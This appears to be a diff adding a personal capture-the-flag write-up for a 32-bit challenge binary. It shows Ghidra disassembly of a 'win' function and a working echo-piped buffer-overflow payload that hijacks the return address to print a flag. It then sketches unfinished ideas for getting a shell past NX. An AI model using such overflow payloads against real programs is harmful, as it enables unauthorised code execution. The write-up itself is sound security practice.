@@ -1,0 +1,48 @@
+=== Personal solution description ===
+
+To get a first flag, we simply need to do a simple buffer overflow to hijack RIP. The printing makes it very easy, we just need to overwrite the return address with the "win" function from Ghidra's decompilation.
+-----------------------------------------------------
+                             **************************************************************
+                             *                                                            *
+                             *  FUNCTION                                                  *
+                             **************************************************************
+                             undefined win()
+             undefined         AL:1           <RETURN>
+             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     080485ac(R)  
+                             win                                             XREF[3]:     Entry Point(*), 08048a68, 
+                                                                                          08048b14(*)  
+        08048586 55              PUSH       EBP
+        08048587 89 e5           MOV        EBP,ESP
+        08048589 53              PUSH       EBX
+        0804858a 83 ec 04        SUB        ESP,0x4
+        0804858d e8 08 01        CALL       __x86.get_pc_thunk.ax                            undefined __x86.get_pc_thunk.ax()
+                 00 00
+        08048592 05 6e 1a        ADD        EAX,0x1a6e
+                 00 00
+        08048597 83 ec 0c        SUB        ESP,0xc
+        0804859a 8d 90 10        LEA        EDX,[EAX + 0xffffe910]=>s_/bin/cat_/flag.txt_0   = "/bin/cat /flag.txt"
+                 e9 ff ff
+        080485a0 52              PUSH       EDX=>s_/bin/cat_/flag.txt_08048910               = "/bin/cat /flag.txt"
+        080485a1 89 c3           MOV        EBX,EAX
+        080485a3 e8 78 fe        CALL       <EXTERNAL>::system                               int system(char * __command)
+                 ff ff
+        080485a8 83 c4 10        ADD        ESP,0x10
+        080485ab 90              NOP
+        080485ac 8b 5d fc        MOV        EBX,dword ptr [EBP + local_8]
+        080485af c9              LEAVE
+        080485b0 c3              RET
+-----------------------------------------------------
+
+So just:
+	$ echo -ne 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x86\x85\x04\x08' | ./server
+
+This will print the flag.
+
+However, there is a second flag that needs to be printed. In fact, the essence of the challenge is in trying to get a shell. That is significantly harder, as the binary has NX protection and because it's dynamically linked, ROP gadgets are scarce.
+There are some ideas we could try:
+	- overwrite "/bin/cat /flag.txt" string with "/bin/sh" and then run the "win" function (can't, it's in .rodata)
+	- find out the address for system and return directly to it with "/bin/sh" in the corresponding register
+	- classic ROP to prepare a syscall (not enough gadgets D:)
+
+
+TBD...
